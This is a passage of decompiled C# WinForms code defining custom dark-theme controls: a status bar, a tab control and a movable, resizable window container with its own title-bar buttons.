							string arg_23B_1 = this.Text;
							Font arg_23B_2 = this.Font;
							Brush arg_23B_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle(22, 2, this.Width, this.Height);
							arg_23B_0.DrawString(arg_23B_1, arg_23B_2, arg_23B_3, rectangle, new StringFormat
							{
								Alignment = StringAlignment.Near,
								LineAlignment = StringAlignment.Near
							});
						}
						else
						{
							flag = (this._Alignment == LogInStatusBar.Alignments.Center);
							if (flag)
							{
								Graphics arg_2A5_0 = graphics2;
								string arg_2A5_1 = this.Text;
								Font arg_2A5_2 = this.Font;
								Brush arg_2A5_3 = new SolidBrush(this._TextColour);
								rectangle = new Rectangle(0, 0, this.Width, this.Height);
								arg_2A5_0.DrawString(arg_2A5_1, arg_2A5_2, arg_2A5_3, rectangle, new StringFormat
								{
									Alignment = StringAlignment.Center,
									LineAlignment = StringAlignment.Center
								});
							}
							else
							{
								Graphics arg_301_0 = graphics2;
								string arg_301_1 = this.Text;
								Font arg_301_2 = this.Font;
								Brush arg_301_3 = new SolidBrush(this._TextColour);
								rectangle = new Rectangle(0, 0, this.Width - 22, this.Height);
								arg_301_0.DrawString(arg_301_1, arg_301_2, arg_301_3, rectangle, new StringFormat
								{
									Alignment = StringAlignment.Far,
									LineAlignment = StringAlignment.Center
								});
							}
						}
						Graphics arg_324_0 = graphics2;
						Brush arg_324_1 = new SolidBrush(this._RectColour);
						rectangle = new Rectangle(5, 9, 14, 3);
						arg_324_0.FillRectangle(arg_324_1, rectangle);
						Graphics arg_34E_0 = graphics2;
						Brush arg_34E_1 = new SolidBrush(this._RectColour);
						rectangle = new Rectangle(this.Width - 20, 9, 14, 3);
						arg_34E_0.FillRectangle(arg_34E_1, rectangle);
						break;
					}
					}
				}
				else
				{
					Graphics arg_3A2_0 = graphics2;
					string arg_3A2_1 = this.Text;
					Font arg_3A2_2 = this.Font;
					Brush arg_3A2_3 = Brushes.White;
					Rectangle rectangle = new Rectangle(5, 2, this.Width, this.Height);
					arg_3A2_0.DrawString(arg_3A2_1, arg_3A2_2, arg_3A2_3, rectangle, new StringFormat
					{
						Alignment = StringAlignment.Near,
						LineAlignment = StringAlignment.Near
					});
				}
				flag = this._ShowBorder;
				if (flag)
				{
					Graphics arg_3E3_0 = graphics2;
					Pen arg_3E3_1 = new Pen(this._BorderColour, 2f);
					Point point = new Point(0, 0);
					Point arg_3E3_2 = point;
					Point pt = new Point(this.Width, 0);
					arg_3E3_0.DrawLine(arg_3E3_1, arg_3E3_2, pt);
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInTabControl : TabControl
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _TextColour;

		private Color _BackTabColour;

		private Color _BaseColour;

		private Color _ActiveColour;

		private Color _BorderColour;

		private Color _UpLineColour;

		private Color _HorizLineColour;

		private StringFormat CenterSF;

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color UpLineColour
		{
			get
			{
				return this._UpLineColour;
			}
			set
			{
				this._UpLineColour = value;
			}
		}

		[Category("Colours")]
		public Color HorizontalLineColour
		{
			get
			{
				return this._HorizLineColour;
			}
			set
			{
				this._HorizLineColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Colours")]
		public Color BackTabColour
		{
			get
			{
				return this._BackTabColour;
			}
			set
			{
				this._BackTabColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color ActiveColour
		{
			get
			{
				return this._ActiveColour;
			}
			set
			{
				this._ActiveColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInTabControl.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInTabControl.__ENCList.Count == LogInTabControl.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInTabControl.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInTabControl.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInTabControl.__ENCList[num] = LogInTabControl.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInTabControl.__ENCList.RemoveRange(num, LogInTabControl.__ENCList.Count - num);
						LogInTabControl.__ENCList.Capacity = LogInTabControl.__ENCList.Count;
					}
					LogInTabControl.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void CreateHandle()
		{
			base.CreateHandle();
			this.Alignment = TabAlignment.Top;
		}

		public LogInTabControl()
		{
			LogInTabControl.__ENCAddToList(this);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._BackTabColour = Color.FromArgb(54, 54, 54);
			this._BaseColour = Color.FromArgb(35, 35, 35);
			this._ActiveColour = Color.FromArgb(47, 47, 47);
			this._BorderColour = Color.FromArgb(30, 30, 30);
			this._UpLineColour = Color.FromArgb(0, 160, 199);
			this._HorizLineColour = Color.FromArgb(23, 119, 151);
			this.CenterSF = new StringFormat
			{
				Alignment = StringAlignment.Center,
				LineAlignment = StringAlignment.Center
			};
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.Font = new Font("Segoe UI", 10f);
			this.SizeMode = TabSizeMode.Normal;
			Size itemSize = new Size(240, 32);
			this.ItemSize = itemSize;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.Clear(this._BaseColour);
			try
			{
				this.SelectedTab.BackColor = this._BackTabColour;
			}
			catch (Exception arg_49_0)
			{
				ProjectData.SetProjectError(arg_49_0);
				ProjectData.ClearProjectError();
			}
			try
			{
				this.SelectedTab.BorderStyle = BorderStyle.FixedSingle;
			}
			catch (Exception arg_67_0)
			{
				ProjectData.SetProjectError(arg_67_0);
				ProjectData.ClearProjectError();
			}
			Graphics arg_9F_0 = graphics2;
			Pen arg_9F_1 = new Pen(this._BorderColour, 2f);
			Rectangle tabRect = new Rectangle(0, 0, this.Width, this.Height);
			arg_9F_0.DrawRectangle(arg_9F_1, tabRect);
			int arg_B0_0 = 0;
			checked
			{
				int num = this.TabCount - 1;
				int num2 = arg_B0_0;
				while (true)
				{
					int arg_328_0 = num2;
					int num3 = num;
					if (arg_328_0 > num3)
					{
						break;
					}
					tabRect = this.GetTabRect(num2);
					int arg_EC_1 = tabRect.Location.X;
					Point location = this.GetTabRect(num2).Location;
					Point point = new Point(arg_EC_1, location.Y);
					Point arg_11E_1 = point;
					int arg_116_1 = this.GetTabRect(num2).Width;
					Rectangle tabRect2 = this.GetTabRect(num2);
					Size size = new Size(arg_116_1, tabRect2.Height);
					Rectangle rectangle = new Rectangle(arg_11E_1, size);
					Point arg_145_1 = rectangle.Location;
					size = new Size(rectangle.Width, rectangle.Height);
					Rectangle rectangle2 = new Rectangle(arg_145_1, size);
					bool flag = num2 == this.SelectedIndex;
					if (flag)
					{
						graphics2.FillRectangle(new SolidBrush(this._BaseColour), rectangle2);
						Graphics arg_1AA_0 = graphics2;
						Brush arg_1AA_1 = new SolidBrush(this._ActiveColour);
						tabRect2 = new Rectangle(rectangle.X + 1, rectangle.Y - 3, rectangle.Width, rectangle.Height + 5);
						arg_1AA_0.FillRectangle(arg_1AA_1, tabRect2);
						Graphics arg_209_0 = graphics2;
						string arg_209_1 = this.TabPages[num2].Text;
						Font arg_209_2 = this.Font;
						Brush arg_209_3 = new SolidBrush(this._TextColour);
						tabRect2 = new Rectangle(rectangle.X + 7, rectangle.Y, rectangle.Width - 3, rectangle.Height);
						arg_209_0.DrawString(arg_209_1, arg_209_2, arg_209_3, tabRect2, this.CenterSF);
						Graphics arg_28C_0 = graphics2;
						Pen arg_28C_1 = new Pen(this._HorizLineColour, 2f);
						point = new Point(rectangle.X + 3, (int)Math.Round(unchecked((double)rectangle.Height / 2.0 + 2.0)));
						Point arg_28C_2 = point;
						location = new Point(rectangle.X + 9, (int)Math.Round(unchecked((double)rectangle.Height / 2.0 + 2.0)));
						arg_28C_0.DrawLine(arg_28C_1, arg_28C_2, location);
						Graphics arg_2DC_0 = graphics2;
						Pen arg_2DC_1 = new Pen(this._UpLineColour, 2f);
						point = new Point(rectangle.X + 3, rectangle.Y - 3);
						Point arg_2DC_2 = point;
						location = new Point(rectangle.X + 3, rectangle.Height + 5);
						arg_2DC_0.DrawLine(arg_2DC_1, arg_2DC_2, location);
					}
					else
					{
						graphics2.DrawString(this.TabPages[num2].Text, this.Font, new SolidBrush(this._TextColour), rectangle2, this.CenterSF);
					}
					num2++;
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
				graphics2 = null;
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInThemeContainer : ContainerControl
	{
		public enum __CloseChoice
		{
			Form,
			Application
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private LogInThemeContainer.__CloseChoice _CloseChoice;

		private int _FontSize;

		private readonly Font _Font;

		private int MouseXLoc;

		private int MouseYLoc;

		private bool CaptureMovement;

		private const int MoveHeight = 35;

		private Point MouseP;

		private Color _FontColour;

		private Color _BaseColour;

		private Color _ContainerColour;

		private Color _BorderColour;

		private Color _HoverColour;

		private int _LockWidth;

		private int _LockHeight;

		private Rectangle Frame;

		private MouseState State;

		private Point GetMouseLocation;

		private Size OldSize;

		private Message[] Messages;

		private Point GetIndexPoint;

		private bool B1;

		private bool B2;

		private bool B3;

		private bool B4;

		private int Current;

		private int Previous;

		private bool WM_LMBUTTONDOWN;

		private bool _Movable;

		private bool _Sizable;

		private bool _ControlMode;

		private bool _SmartBounds;

		private bool _IsParentForm;

		private bool _AllowMinimize;

		private bool _AllowMaximize;

		private bool _ShowIcon;

		private bool _AllowClose;

		protected int LockWidth
		{
			get
			{
				return this._LockWidth;
			}
			set
			{
				this._LockWidth = value;
				bool flag = this.LockWidth != 0 && this.IsHandleCreated;
				if (flag)
				{
					this.Width = this.LockWidth;
				}
			}
		}

		protected int LockHeight
		{
			get
			{
				return this._LockHeight;
			}
			set
			{
				this._LockHeight = value;
				bool flag = this.LockHeight != 0 && this.IsHandleCreated;
				if (flag)
				{
					this.Height = this.LockHeight;
				}
			}
		}

		public LogInThemeContainer.__CloseChoice CloseChoice
		{
			get
			{
				return this._CloseChoice;
			}
			set
			{
				this._CloseChoice = value;
			}
		}

		public bool Movable
		{
			get
			{
				return this._Movable;
			}
			set
			{
				this._Movable = value;
			}
		}

		public bool Sizable
		{
			get
			{
				return this._Sizable;
			}
			set
			{
				this._Sizable = value;
			}
		}

		protected bool ControlMode
		{
			get
			{
				return this._ControlMode;
			}
			set
			{
				this._ControlMode = value;
				this.Invalidate();
			}
		}

		public bool SmartBounds
		{
			get
			{
				return this._SmartBounds;
			}
			set
			{
				this._SmartBounds = value;
			}
		}

		protected bool IsParentForm
		{
			get
			{
				return this._IsParentForm;
			}
		}

		protected bool IsParentMdi
		{
			get
			{
				bool flag = this.Parent == null;
				return !flag && this.Parent.Parent != null;
			}
		}

		[Category("Control")]
		public int FontSize
		{
			get
			{
				return this._FontSize;
			}
			set
			{
				this._FontSize = value;
			}
		}

		[Category("Control")]
		public bool AllowMinimize
		{
			get
			{
				return this._AllowMinimize;
			}
			set
			{
				this._AllowMinimize = value;
			}
		}

		[Category("Control")]
		public bool AllowMaximize
		{
			get
			{
				return this._AllowMaximize;
			}
			set
			{
				this._AllowMaximize = value;
			}
		}

		[Category("Control")]
		public bool ShowIcon
		{
			get
			{
				return this._ShowIcon;
			}
			set
			{
				this._ShowIcon = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool AllowClose
		{
			get
			{
				return this._AllowClose;
			}
			set
			{
				this._AllowClose = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color HoverColour
		{
			get
			{
				return this._HoverColour;
			}
			set
			{
				this._HoverColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color ContainerColour
		{
			get
			{
				return this._ContainerColour;
			}
			set
			{
				this._ContainerColour = value;
			}
		}

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInThemeContainer.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInThemeContainer.__ENCList.Count == LogInThemeContainer.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInThemeContainer.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInThemeContainer.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInThemeContainer.__ENCList[num] = LogInThemeContainer.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInThemeContainer.__ENCList.RemoveRange(num, LogInThemeContainer.__ENCList.Count - num);
						LogInThemeContainer.__ENCList.Capacity = LogInThemeContainer.__ENCList.Count;
					}
					LogInThemeContainer.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected sealed override void OnSizeChanged(EventArgs e)
		{
			bool flag = this._Movable && !this._ControlMode;
			if (flag)
			{
				this.Frame = new Rectangle(7, 7, checked(this.Width - 14), 35);
			}
			this.Invalidate();
			base.OnSizeChanged(e);
		}

		protected override void SetBoundsCore(int x, int y, int width, int height, BoundsSpecified specified)
		{
			bool flag = this._LockWidth != 0;
			if (flag)
			{
				width = this._LockWidth;
			}
			flag = (this._LockHeight != 0);
			if (flag)
			{
				height = this._LockHeight;
			}
			base.SetBoundsCore(x, y, width, height, specified);
		}

		private void SetState(MouseState current)
		{
			this.State = current;
			this.Invalidate();
		}

		protected override void OnMouseMove(MouseEventArgs e)
		{
			bool flag = !this._IsParentForm || this.ParentForm.WindowState != FormWindowState.Maximized;
			if (flag)
			{
				bool flag2 = this._Sizable && !this._ControlMode;
				if (flag2)
				{
					this.InvalidateMouse();
				}
			}
			base.OnMouseMove(e);
			this.SetState(MouseState.Over);
		}

		protected override void OnEnabledChanged(EventArgs e)
		{
			bool enabled = this.Enabled;
			if (enabled)
			{
				this.SetState(MouseState.None);
			}
			else
			{
				this.SetState(MouseState.Block);
			}
			base.OnEnabledChanged(e);
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			this.SetState(MouseState.Over);
			base.OnMouseEnter(e);
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			this.SetState(MouseState.Over);
			base.OnMouseUp(e);
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			this.SetState(MouseState.None);
			bool flag = this.GetChildAtPoint(this.PointToClient(Control.MousePosition)) != null;
			if (flag)
			{
				bool flag2 = this._Sizable && !this._ControlMode;
				if (flag2)
				{
					this.Cursor = Cursors.Default;
					this.Previous = 0;
				}
			}
			base.OnMouseLeave(e);
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left;
			if (flag)
			{
				this.SetState(MouseState.Down);
			}
			flag = ((!this._IsParentForm || this.ParentForm.WindowState != FormWindowState.Maximized) && !this._ControlMode);
			if (flag)
			{
				bool flag2 = this._Movable && this.Frame.Contains(e.Location);
				if (flag2)
				{
					this.Capture = false;
					this.WM_LMBUTTONDOWN = true;
					this.DefWndProc(ref this.Messages[0]);
				}
				else
				{
					flag2 = (this._Sizable && this.Previous != 0);
					if (flag2)
					{
						this.Capture = false;
						this.WM_LMBUTTONDOWN = true;
						this.DefWndProc(ref this.Messages[this.Previous]);
					}
				}
			}
			this.GetMouseLocation = this.PointToClient(Control.MousePosition);
			checked
			{
				bool flag2 = this.GetMouseLocation.X > this.Width - 39 && this.GetMouseLocation.X < this.Width - 16 && this.GetMouseLocation.Y < 22;
				if (flag2)
				{
					flag = this._AllowClose;
					if (flag)
					{
						bool flag3 = this._CloseChoice == LogInThemeContainer.__CloseChoice.Application;
						if (flag3)
						{
							Environment.Exit(0);
						}
						else
						{
							this.ParentForm.Close();
						}
					}
				}
				else
				{
					bool flag3 = this.GetMouseLocation.X > this.Width - 64 && this.GetMouseLocation.X < this.Width - 41 && this.GetMouseLocation.Y < 22;
					if (flag3)
					{
						flag2 = this._AllowMaximize;
						if (flag2)
						{
							switch (this.FindForm().WindowState)
							{
							case FormWindowState.Normal:
								this.OldSize = this.Size;
								this.FindForm().WindowState = FormWindowState.Maximized;
								break;
							case FormWindowState.Maximized:
								this.FindForm().WindowState = FormWindowState.Normal;
								break;
							}
						}
					}
					else
					{
						flag3 = (this.GetMouseLocation.X > this.Width - 89 && this.GetMouseLocation.X < this.Width - 66 && this.GetMouseLocation.Y < 22);
						if (flag3)
						{
							flag2 = this._AllowMinimize;
							if (flag2)
							{
								switch (this.FindForm().WindowState)
								{
								case FormWindowState.Normal:
									this.OldSize = this.Size;
									this.FindForm().WindowState = FormWindowState.Minimized;
									break;
								case FormWindowState.Maximized:
									this.FindForm().WindowState = FormWindowState.Minimized;
									break;
								}
							}
						}
					}
				}
				base.OnMouseDown(e);
			}
		}

		private void InitializeMessages()
		{
			Message[] arg_31_0_cp_0 = this.Messages;
			int arg_31_0_cp_1 = 0;
			IntPtr arg_2C_0 = this.Parent.Handle;
			int arg_2C_1 = 161;
			IntPtr wparam = new IntPtr(2);
			arg_31_0_cp_0[arg_31_0_cp_1] = Message.Create(arg_2C_0, arg_2C_1, wparam, IntPtr.Zero);
			int num = 1;
			checked
			{
				int arg_79_0;
				int num2;
				do
				{
					Message[] arg_6B_0_cp_0 = this.Messages;
					int arg_6B_0_cp_1 = num;
					IntPtr arg_66_0 = this.Parent.Handle;
					int arg_66_1 = 161;
					wparam = new IntPtr(num + 9);
					arg_6B_0_cp_0[arg_6B_0_cp_1] = Message.Create(arg_66_0, arg_66_1, wparam, IntPtr.Zero);
					num++;
					arg_79_0 = num;
					num2 = 8;
				}
				while (arg_79_0 <= num2);
			}
		}

		private int GetMouseIndex()
		{
			this.GetIndexPoint = this.PointToClient(Control.MousePosition);
			this.B1 = (this.GetIndexPoint.X < 6);
			checked
			{
				this.B2 = (this.GetIndexPoint.X > this.Width - 6);
				this.B3 = (this.GetIndexPoint.Y < 6);
				this.B4 = (this.GetIndexPoint.Y > this.Height - 6);
				bool flag = this.B1 && this.B3;
				int result;
				if (flag)
				{
					result = 4;
				}
				else
				{
					flag = (this.B1 && this.B4);
					if (flag)
					{
						result = 7;
					}
					else
					{
						flag = (this.B2 && this.B3);
						if (flag)
						{
							result = 5;
						}
						else
						{
							flag = (this.B2 && this.B4);
							if (flag)
							{
								result = 8;
							}
							else
							{
								flag = this.B1;
								if (flag)
								{
									result = 1;
								}
								else
								{
									flag = this.B2;
									if (flag)
									{
										result = 2;
									}
									else
									{
										flag = this.B3;
										if (flag)
										{
											result = 3;
										}
										else
										{
											flag = this.B4;
											if (flag)
											{
												result = 6;
											}
											else
											{
												result = 0;
											}
										}
									}
								}
							}
						}
					}
				}
				return result;
			}
		}

		private void InvalidateMouse()
		{
			this.Current = this.GetMouseIndex();
			bool flag = this.Current == this.Previous;
			if (!flag)
			{
				this.Previous = this.Current;
				switch (this.Previous)
				{
				case 0:
					this.Cursor = Cursors.Default;
					break;
				case 1:
				case 2:
					this.Cursor = Cursors.SizeWE;
					break;
				case 3:
				case 6:
					this.Cursor = Cursors.SizeNS;
					break;
				case 4:
				case 8:
					this.Cursor = Cursors.SizeNWSE;
					break;
				case 5:
				case 7:
					this.Cursor = Cursors.SizeNESW;
					break;
				}
			}
		}

		protected override void WndProc(ref Message m)
		{
			base.WndProc(ref m);
			bool flag = this.WM_LMBUTTONDOWN && m.Msg == 513;
			if (flag)
			{
				this.WM_LMBUTTONDOWN = false;
				this.SetState(MouseState.Over);
				flag = !this._SmartBounds;
				if (!flag)
				{
					flag = this.IsParentMdi;
					if (flag)
					{
						Rectangle bounds = new Rectangle(Point.Empty, this.Parent.Parent.Size);
						this.CorrectBounds(bounds);
					}
					else
					{
						try
						{
							this.CorrectBounds(Screen.FromControl(this.Parent).WorkingArea);
						}
						catch (Exception arg_91_0)
						{
							ProjectData.SetProjectError(arg_91_0);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
		}

		private void CorrectBounds(Rectangle bounds)
		{
			bool flag = this.Parent.Width > bounds.Width;
			if (flag)
			{
				this.Parent.Width = bounds.Width;
			}
			flag = (this.Parent.Height > bounds.Height);
			if (flag)
			{
				this.Parent.Height = bounds.Height;
			}
			int num = this.Parent.Location.X;
			int num2 = this.Parent.Location.Y;
			flag = (num < bounds.X);
			if (flag)
			{
				num = bounds.X;
			}
			flag = (num2 < bounds.Y);
			if (flag)
			{
				num2 = bounds.Y;
			}
			checked
			{
				int num3 = bounds.X + bounds.Width;
				int num4 = bounds.Y + bounds.Height;
				flag = (num + this.Parent.Width > num3);
				if (flag)
				{
					num = num3 - this.Parent.Width;
				}
				flag = (num2 + this.Parent.Height > num4);
				if (flag)
				{
					num2 = num4 - this.Parent.Height;
				}
				flag = (this.FindForm().WindowState == FormWindowState.Maximized | this.FindForm().WindowState == FormWindowState.Minimized);
				if (flag)
				{
					this.Parent.Size = this.OldSize;
				}
			}
		}

		protected sealed override void OnHandleCreated(EventArgs e)
		{
			bool flag = this._LockWidth != 0;
			if (flag)
			{
				this.Width = this._LockWidth;
			}
			flag = (this._LockHeight != 0);
			if (flag)
			{
				this.Height = this._LockHeight;
			}
			flag = !this._ControlMode;
			if (flag)
			{
				base.Dock = DockStyle.Fill;
			}
		}

		protected sealed override void OnParentChanged(EventArgs e)
		{
			base.OnParentChanged(e);
			bool flag = this.Parent == null;
			if (!flag)
			{
				this._IsParentForm = (this.Parent is Form);
				flag = !this._ControlMode;
				if (flag)
				{
					this.InitializeMessages();
					this.Parent.BackColor = this.BackColor;
				}
			}
		}

		public LogInThemeContainer()
		{
			LogInThemeContainer.__ENCAddToList(this);
			this._CloseChoice = LogInThemeContainer.__CloseChoice.Form;
			this._FontSize = 12;
			this._Font = new Font("Segoe UI", (float)this._FontSize);
			this.CaptureMovement = false;
			this.MouseP = new Point(0, 0);
			this._FontColour = Color.FromArgb(255, 255, 255);
			this._BaseColour = Color.FromArgb(35, 35, 35);
			this._ContainerColour = Color.FromArgb(54, 54, 54);
			this._BorderColour = Color.FromArgb(60, 60, 60);
			this._HoverColour = Color.FromArgb(42, 42, 42);
			this.State = MouseState.None;
			this.Messages = new Message[9];
			this._Movable = true;
			this._Sizable = true;
			this._SmartBounds = true;
			this._AllowMinimize = true;
			this._AllowMaximize = true;
			this._ShowIcon = true;
			this._AllowClose = true;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = this._BaseColour;
			this.Dock = DockStyle.Fill;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			Graphics arg_45_0 = graphics2;
			Brush arg_45_1 = new SolidBrush(this._BaseColour);
			Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
			arg_45_0.FillRectangle(arg_45_1, rectangle);
			Graphics arg_74_0 = graphics2;
			Brush arg_74_1 = new SolidBrush(this._ContainerColour);
			checked
			{
				rectangle = new Rectangle(2, 35, this.Width - 4, this.Height - 37);
				arg_74_0.FillRectangle(arg_74_1, rectangle);
				Graphics arg_9D_0 = graphics2;
				Pen arg_9D_1 = new Pen(this._BorderColour);
				rectangle = new Rectangle(0, 0, this.Width, this.Height);
				arg_9D_0.DrawRectangle(arg_9D_1, rectangle);
				Point[] array = new Point[4];
				Point[] arg_C7_0_cp_0 = array;
				int arg_C7_0_cp_1 = 0;
				Point point = new Point(this.Width - 90, 0);
				arg_C7_0_cp_0[arg_C7_0_cp_1] = point;
				Point[] arg_E9_0_cp_0 = array;
				int arg_E9_0_cp_1 = 1;
				Point point2 = new Point(this.Width - 90, 22);
				arg_E9_0_cp_0[arg_E9_0_cp_1] = point2;
				Point[] arg_10B_0_cp_0 = array;
				int arg_10B_0_cp_1 = 2;
				Point point3 = new Point(this.Width - 15, 22);
				arg_10B_0_cp_0[arg_10B_0_cp_1] = point3;
				Point[] arg_12C_0_cp_0 = array;
				int arg_12C_0_cp_1 = 3;
				Point point4 = new Point(this.Width - 15, 0);
				arg_12C_0_cp_0[arg_12C_0_cp_1] = point4;
				Point[] points = array;
				graphics2.DrawLines(new Pen(this._BorderColour), points);
				graphics2.DrawLine(new Pen(this._BorderColour), this.Width - 65, 0, this.Width - 65, 22);
				this.GetMouseLocation = this.PointToClient(Control.MousePosition);
				MouseState state = this.State;
				bool flag = state == MouseState.Over;
				bool flag2;
				if (flag)
				{
					flag2 = (this.GetMouseLocation.X > this.Width - 39 && this.GetMouseLocation.X < this.Width - 16 && this.GetMouseLocation.Y < 22);
					if (flag2)
					{
						Graphics arg_1FF_0 = graphics2;
						Brush arg_1FF_1 = new SolidBrush(this._HoverColour);
						rectangle = new Rectangle(this.Width - 39, 0, 23, 22);
						arg_1FF_0.FillRectangle(arg_1FF_1, rectangle);
					}
					else
					{
						flag2 = (this.GetMouseLocation.X > this.Width - 64 && this.GetMouseLocation.X < this.Width - 41 && this.GetMouseLocation.Y < 22);
						if (flag2)
						{
							Graphics arg_272_0 = graphics2;
							Brush arg_272_1 = new SolidBrush(this._HoverColour);
							rectangle = new Rectangle(this.Width - 64, 0, 23, 22);
							arg_272_0.FillRectangle(arg_272_1, rectangle);
						}
						else
						{
							flag2 = (this.GetMouseLocation.X > this.Width - 89 && this.GetMouseLocation.X < this.Width - 66 && this.GetMouseLocation.Y < 22);
							if (flag2)
							{
								Graphics arg_2E2_0 = graphics2;
								Brush arg_2E2_1 = new SolidBrush(this._HoverColour);
								rectangle = new Rectangle(this.Width - 89, 0, 23, 22);
								arg_2E2_0.FillRectangle(arg_2E2_1, rectangle);
							}
						}
					}
				}
				graphics2.DrawLine(new Pen(this._BorderColour), this.Width - 40, 0, this.Width - 40, 22);
				graphics2.DrawLine(new Pen(this._FontColour, 2f), this.Width - 33, 6, this.Width - 22, 16);
				graphics2.DrawLine(new Pen(this._FontColour, 2f), this.Width - 33, 16, this.Width - 22, 6);
				graphics2.DrawLine(new Pen(this._FontColour), this.Width - 83, 16, this.Width - 72, 16);
				graphics2.DrawLine(new Pen(this._FontColour), this.Width - 58, 16, this.Width - 47, 16);
				graphics2.DrawLine(new Pen(this._FontColour), this.Width - 58, 16, this.Width - 58, 6);
				graphics2.DrawLine(new Pen(this._FontColour), this.Width - 47, 16, this.Width - 47, 6);
				graphics2.DrawLine(new Pen(this._FontColour), this.Width - 58, 6, this.Width - 47, 6);
				graphics2.DrawLine(new Pen(this._FontColour), this.Width - 58, 7, this.Width - 47, 7);
				flag2 = this._ShowIcon;
				if (flag2)
				{
					Graphics arg_47A_0 = graphics2;
					Icon arg_47A_1 = this.FindForm().Icon;
					rectangle = new Rectangle(6, 6, 22, 22);
					arg_47A_0.DrawIcon(arg_47A_1, rectangle);
					Graphics arg_4D6_0 = graphics2;
					string arg_4D6_1 = this.Text;
					Font arg_4D6_2 = this._Font;
					Brush arg_4D6_3 = new SolidBrush(this._FontColour);
					RectangleF layoutRectangle = new RectangleF(31f, 0f, (float)(this.Width - 110), 35f);
					arg_4D6_0.DrawString(arg_4D6_1, arg_4D6_2, arg_4D6_3, layoutRectangle, new StringFormat
					{
						LineAlignment = StringAlignment.Center,
						Alignment = StringAlignment.Near
					});
				}
				else
				{
					Graphics arg_535_0 = graphics2;
					string arg_535_1 = this.Text;
					Font arg_535_2 = this._Font;
					Brush arg_535_3 = new SolidBrush(this._FontColour);
					RectangleF layoutRectangle = new RectangleF(4f, 0f, (float)(this.Width - 110), 35f);
